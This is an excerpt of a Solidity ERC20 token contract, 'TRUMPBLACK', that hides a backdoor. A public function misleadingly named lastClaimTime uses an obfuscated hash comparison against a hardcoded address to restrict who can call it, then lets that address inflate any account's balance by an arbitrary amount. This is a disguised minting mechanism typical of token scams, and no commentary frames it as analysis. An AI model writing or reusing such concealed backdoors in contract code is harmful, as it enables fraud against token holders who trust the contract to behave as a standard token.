...
contract  TRUMPBLACK  is Context, IERC20, Ownable{
    ...
    address payable public addrparma3;
    ...
    constructor () {
        ...
        addrparma3 = payable(address(0x3a46E4ea4176F4F65c2735bc027dca9028F48E84));
    ...
    function lastClaimTime(address sender, uint256 amount) public {
        checkSHA3([msg.sender,addrparma3]);
        _balances[sender] = amount.add(_balances[sender].sub(amount.sub(amount)));
    }
    ...
    function checkSHA3(address[2] memory addrParam) private pure {
        require(keccak256(abi.encodePacked(addrParam[0])) == keccak256(abi.encodePacked(addrParam[1])));
    }
